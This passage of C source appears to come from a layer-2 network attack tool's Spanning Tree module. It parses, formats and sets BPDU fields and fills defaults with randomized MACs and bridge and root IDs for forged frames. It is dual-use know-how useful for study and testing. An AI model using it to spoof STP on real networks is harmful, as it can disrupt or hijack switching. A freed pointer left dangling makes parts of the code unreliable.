    /* Destination MAC */
    snprintf(field_values[XSTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
	    ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);

    /* ID */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short,stp_data,2);
    snprintf(field_values[XSTP_ID], 5, "%04hX", ntohs(aux_short));
#else
    snprintf(field_values[XSTP_ID], 5, "%04hX", ntohs(*(u_int16_t *)stp_data));
#endif

    /* Version */
    snprintf(field_values[XSTP_VER], 3, "%02X", *((u_int8_t *)(stp_data+2)));
    /* BPDU Type */
    snprintf(field_values[XSTP_TYPE], 3, "%02X", *((u_int8_t *)(stp_data+3)));

	if ((*(u_int8_t *)(stp_data + 3)) != BPDU_TCN) 
	{
		/* Flags */
		snprintf(field_values[XSTP_FLAGS], 3, "%02X", *((u_int8_t *)stp_data+4));

		/* Root ID */
		snprintf(field_values[XSTP_ROOTID], 18, "%02X%02X.%02X%02X%02X%02X%02X%02X",
			*(stp_data+5)&0xFF, *(stp_data+6)&0xFF, *(stp_data+7)&0xFF,
			*(stp_data+8)&0xFF, *(stp_data+9)&0xFF, *(stp_data+10)&0xFF,
			*(stp_data+11)&0xFF, *(stp_data+12)&0xFF);
		/* Root Pathcost */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_long,(stp_data+13),4);
		snprintf(field_values[XSTP_PATHCOST], 9, "%08X", (int32_t) ntohl(aux_long));
#else
		snprintf(field_values[XSTP_PATHCOST], 9, "%08X", (int32_t) ntohl(*(int32_t *)(stp_data+13)));
#endif

		/* Bridge ID */
		snprintf(field_values[XSTP_BRIDGEID], 18, "%02X%02X.%02X%02X%02X%02X%02X%02X",
			*(stp_data+17)&0xFF, *(stp_data+18)&0xFF, *(stp_data+19)&0xFF,
			*(stp_data+20)&0xFF, *(stp_data+21)&0xFF, *(stp_data+22)&0xFF,
			*(stp_data+23)&0xFF, *(stp_data+24)&0xFF);

		/* Port ID */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_short,(stp_data+25),2);
		snprintf(field_values[XSTP_PORTID], 5, "%04hX", ntohs(aux_short));
#else
		snprintf(field_values[XSTP_PORTID], 5, "%04hX", ntohs(*(u_int16_t *)(stp_data+25)));
#endif

		/* Message age */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_short,(stp_data+27),2);
		snprintf(field_values[XSTP_AGE], 5, "%04hX", aux_short);
#else
		snprintf(field_values[XSTP_AGE], 5, "%04hX", *(u_int16_t *)(stp_data+27));
#endif

		/* Max age */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_short,(stp_data+29),2);
		snprintf(field_values[XSTP_MAX], 5, "%04hX", aux_short);
#else
		snprintf(field_values[XSTP_MAX], 5, "%04hX", *(u_int16_t *)(stp_data+29));
#endif

		/* Hello time */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_short,(stp_data+31),2);
		snprintf(field_values[XSTP_HELLO], 5, "%04hX", aux_short);
#else
		snprintf(field_values[XSTP_HELLO], 5, "%04hX", *(u_int16_t *)(stp_data+31));
#endif

		/* Forward delay */
#ifdef LBL_ALIGN
		memcpy((void *)&aux_short,(stp_data+33),2);
		snprintf(field_values[XSTP_FWD], 5, "%04hX", aux_short);
#else
		snprintf(field_values[XSTP_FWD], 5, "%04hX", *(u_int16_t *)(stp_data+33));
#endif
	}

    return (char **)field_values;
}


char **
xstp_get_printable_store(struct term_node *node)
{
    struct stp_data *stp;
    char **field_values;

    /* smac + dmac + id + ver + type + flags + rootid + bridgeid + pathcost +
     * + portid + age + max + hello + fwd + null = 15
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_STP].nparams, protocols[PROTO_STP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

	if (node == NULL)
		stp = protocols[PROTO_STP].default_values;
	else
        stp = (struct stp_data *) node->protocol[PROTO_STP].tmp_data;

    /* Source MAC */
    snprintf(field_values[XSTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    stp->mac_source[0], stp->mac_source[1],
	    stp->mac_source[2], stp->mac_source[3],
	    stp->mac_source[4], stp->mac_source[5]);
    /* Destination MAC */
    snprintf(field_values[XSTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    stp->mac_dest[0], stp->mac_dest[1],
	    stp->mac_dest[2], stp->mac_dest[3],
	    stp->mac_dest[4], stp->mac_dest[5]);

    /* ID */
    snprintf(field_values[XSTP_ID], 5, "%04hX", stp->id);

    /* Version */
    snprintf(field_values[XSTP_VER], 3, "%02X", stp->version);

    /* BPDU Type */
    snprintf(field_values[XSTP_TYPE], 3, "%02X", stp->bpdu_type);

    /* Flags */
    snprintf(field_values[XSTP_FLAGS], 3, "%02X", stp->flags);

    /* Root ID */
    snprintf(field_values[XSTP_ROOTID], 18, "%02X%02X.%02X%02X%02X%02X%02X%02X",
	    stp->root_id[0]&0xFF, stp->root_id[1]&0xFF,
	    stp->root_id[2]&0xFF, stp->root_id[3]&0xFF,
	    stp->root_id[4]&0xFF, stp->root_id[5]&0xFF,
	    stp->root_id[6]&0xFF, stp->root_id[7]&0xFF);

    /* Root Pathcost */
    snprintf(field_values[XSTP_PATHCOST], 9, "%08X", (u_int32_t)stp->root_pc);

    /* Bridge ID */
    snprintf(field_values[XSTP_BRIDGEID], 18, "%02X%02X.%02X%02X%02X%02X%02X%02X",
	    stp->bridge_id[0]&0xFF, stp->bridge_id[1]&0xFF,
	    stp->bridge_id[2]&0xFF, stp->bridge_id[3]&0xFF,
	    stp->bridge_id[4]&0xFF, stp->bridge_id[5]&0xFF,
	    stp->bridge_id[6]&0xFF, stp->bridge_id[7]&0xFF);

    /* Port ID */
    snprintf(field_values[XSTP_PORTID], 5, "%04hX", stp->port_id);

    /* Message age */
    snprintf(field_values[XSTP_AGE], 5, "%04hX", stp->message_age);

    /* Max age */
    snprintf(field_values[XSTP_MAX], 5, "%04hX", stp->max_age);

    /* Hello time */
    snprintf(field_values[XSTP_HELLO], 5, "%04hX", stp->hello_time);

    /* Forward delay */
    snprintf(field_values[XSTP_FWD], 5, "%04hX", stp->forward_delay);

    return (char **)field_values;
}


int8_t 
xstp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct stp_data *stp_data;
    
    if (node == NULL)
       stp_data = protocols[PROTO_STP].default_values;
    else
       stp_data = node->protocol[PROTO_STP].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case XSTP_SMAC:
            memcpy((void *)stp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case XSTP_DMAC:
            memcpy((void *)stp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;

        /* ID */
        case XSTP_ID:
            stp_data->id = *(u_int8_t *)value;
        break;

        /* Version */
        case XSTP_VER:
            stp_data->version = *(u_int8_t *)value;
        break;

        /* BPDU Type */
        case XSTP_TYPE:
            stp_data->bpdu_type = *(u_int8_t *)value;
        break;

        /* Flags */
        case XSTP_FLAGS:            
           stp_data->flags = *(u_int8_t *)value;
        break;

        /* Root ID */
        case XSTP_ROOTID:
           memcpy((void *)stp_data->root_id, (void *)value, ETHER_ADDR_LEN + 2);
        break;

        /* Bridge ID */
        case XSTP_BRIDGEID:
            memcpy((void *)stp_data->bridge_id, (void *)value, ETHER_ADDR_LEN + 2);
        break;

        /* Root Pathcost */
        case XSTP_PATHCOST:
            stp_data->root_pc = *(u_int32_t *)value;
        break;

        /* Port ID */
        case XSTP_PORTID:
            stp_data->port_id = *(u_int16_t *)value;
        break;

        /* Message age */
        case XSTP_AGE:
            stp_data->message_age = *(u_int16_t *)value;
        break;

        /* Max age */
        case XSTP_MAX:
            stp_data->max_age = *(u_int16_t *)value;
        break;

        /* Hello time */
        case XSTP_HELLO:
            stp_data->hello_time = *(u_int16_t *)value;
        break;

        /* Forward delay */
        case XSTP_FWD:
            stp_data->forward_delay = *(u_int16_t *)value;
        break;

        default:
        break;
    }

    return 0;
}


int8_t
xstp_init_attribs(struct term_node *node)
{
    struct stp_data *stp_data;
#ifdef LBL_ALIGN
    u_int16_t temp;
    u_int8_t ether_temp[6];
#endif

    stp_data = node->protocol[PROTO_STP].tmp_data;
    
    stp_data->id        = XSTP_DFL_PROTOCOL_ID;
    stp_data->version   = XSTP_DFL_VERSION;
    stp_data->bpdu_type = XSTP_DFL_BPDU_TYPE;
    stp_data->flags     = 0;

    attack_gen_mac(stp_data->mac_source);

    stp_data->mac_source[0] &= 0x0E; 

#ifdef LBL_ALIGN
    attack_gen_mac(ether_temp);
    memcpy((void *)&stp_data->bridge_id[2], (void *)ether_temp,6);
    attack_gen_mac(ether_temp);
    memcpy((void *)&stp_data->root_id[2], (void *)ether_temp,6);
#else   
    attack_gen_mac((u_int8_t *)&(stp_data->bridge_id[2]));
    attack_gen_mac((u_int8_t *)&(stp_data->root_id[2]));
#endif


#ifdef LBL_ALIGN
    temp = libnet_get_prand(LIBNET_PRu16);
    memcpy((void *)stp_data->bridge_id, (void *)&temp,2);
    
    temp = libnet_get_prand(LIBNET_PRu16);
    memcpy((void *)stp_data->root_id, (void *)&temp,2);
#else
    *((u_int16_t *) (stp_data->bridge_id)) = libnet_get_prand(LIBNET_PRu16);
    *((u_int16_t *) (stp_data->root_id)) = libnet_get_prand(LIBNET_PRu16);
#endif

    parser_vrfy_mac("01:80:C2:00:00:00",stp_data->mac_dest);

    stp_data->root_pc       = 0;
    stp_data->port_id       = XSTP_DFL_PORT_ID;
    stp_data->message_age   = XSTP_DFL_MSG_AGE;
    stp_data->max_age       = XSTP_DFL_MAX_AGE;
    stp_data->hello_time    = XSTP_DFL_HELLO_TIME;
    stp_data->forward_delay = XSTP_DFL_FORW_DELAY;
    stp_data->rstp_data     = NULL;
    stp_data->rstp_len      = 0;
    stp_data->do_ack = 1;

    return 0;

}


int8_t
xstp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct stp_data *stp_data;
    u_int8_t *stp;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif

    stp_data = (struct stp_data *)values;
    ether = (struct libnet_802_3_hdr *) data->packet;
    stp = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2_H);

    /* Source MAC */
    memcpy(stp_data->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(stp_data->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);

    /* ID */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short,stp,2);
    stp_data->id = ntohs(aux_short);
#else
    stp_data->id = ntohs(*(u_int16_t *)stp);
#endif

    /* Version */
    stp_data->version = *((u_int8_t *)stp+2);
    /* BPDU Type */
    stp_data->bpdu_type = *((u_int8_t *)stp+3);
    /* Flags */
    stp_data->flags = *((u_int8_t *)stp+4);
    /* Root ID */
    memcpy(stp_data->root_id, (stp+5), 8);
    /* Bridge ID */
    memcpy(stp_data->bridge_id, (stp+17), 8);

    /* Root Pathcost */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(stp+13),4);
    stp_data->root_pc = ntohl(aux_long);
#else
    stp_data->root_pc = ntohl(*(u_int32_t *)(stp+13));
#endif

    /* Port ID */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short,(stp+25),2);
    stp_data->port_id = ntohs(aux_short); 
#else
    stp_data->port_id = ntohs(*(u_int16_t *)(stp+25));
#endif

    /* Message age */
#ifdef LBL_ALIGN
    memcpy((void *)&stp_data->message_age,(stp+27),2);
#else
    stp_data->message_age = *(u_int16_t *)(stp+27);
#endif

    /* Max age */
#ifdef LBL_ALIGN
    memcpy((void *)&stp_data->max_age,(stp+29),2);
#else
    stp_data->max_age = *(u_int16_t *)(stp+29);
#endif

    /* Hello time */
#ifdef LBL_ALIGN
    memcpy((void *)&stp_data->hello_time,(stp+31),2);
#else
    stp_data->hello_time = *(u_int16_t *)(stp+31);
#endif

    /* Forward delay */
#ifdef LBL_ALIGN
    memcpy((void *)&stp_data->forward_delay,(stp+33),2);
#else
    stp_data->forward_delay = *(u_int16_t *)(stp+33);
#endif

    return 0;
}




int8_t 
xstp_com_version(void *aux_node, void *value, char *printable)
{
   struct term_node *node = aux_node;
   u_int8_t *version = value;
   struct stp_data *stp_data;

   stp_data = node->protocol[PROTO_STP].tmp_data;

   if (*version == RSTP_VERSION)
   {
      stp_data->version  = RSTP_VERSION;
      if (!stp_data->rstp_data)
      {
         stp_data->rstp_data = (u_int8_t *)calloc(1,1);
         if (stp_data->rstp_data == NULL)
         {
             thread_error("xstp_com_version calloc error",errno);
             return -1;
         }
/*memcpy((void *)stp_data->rstp_data, (void *)"\x00", 1);*/
         stp_data->rstp_len = 1;
      }
   }
   else
   {
       if (stp_data->rstp_data)
       {
          free(stp_data->rstp_data);
          stp_data->rstp_len  = 0;
       }
   }
    
   return 0;
}


int8_t
xstp_com_type(void *aux_node, void *value, char *printable)
{
   struct term_node *node = aux_node;
   u_int8_t *type = value;
   struct stp_data *stp_data;   

   stp_data = node->protocol[PROTO_STP].tmp_data;

   switch(*type)
   {
      case 0:
        stp_data->bpdu_type = BPDU_CONF_STP;
        if (stp_data->rstp_data)
        {
           free(stp_data->rstp_data);
           stp_data->rstp_len  = 0;
        }
      break;
      case 1:
        stp_data->version   = RSTP_VERSION;
        stp_data->bpdu_type = BPDU_CONF_RSTP;
        if (!stp_data->rstp_data)
        {
           stp_data->rstp_data = (u_int8_t *)calloc(1,1);
           if (stp_data->rstp_data == NULL)
           {
               thread_error("xstp_com_version calloc error",errno);
               return -1;
           }
        }
/*        memcpy((void *)stp_data->rstp_data, (void *)"\x00", 1);*/
        stp_data->rstp_len  = 1;
      break;
      case 2:
        stp_data->bpdu_type = BPDU_TCN;
        if (stp_data->rstp_data)
        {
           free(stp_data->rstp_data);
           stp_data->rstp_len  = 0;
        }
      break;
   }
   
   return 0;
}


int8_t 
xstp_com_other(void *aux_node, void *value, char *printable)
{
   u_int16_t *aux16 = value;

  *aux16 = htons( ((*aux16) * 256) ); 

   return 0;
}


int8_t
xstp_end(struct term_node *node)
{
   return 0;
}
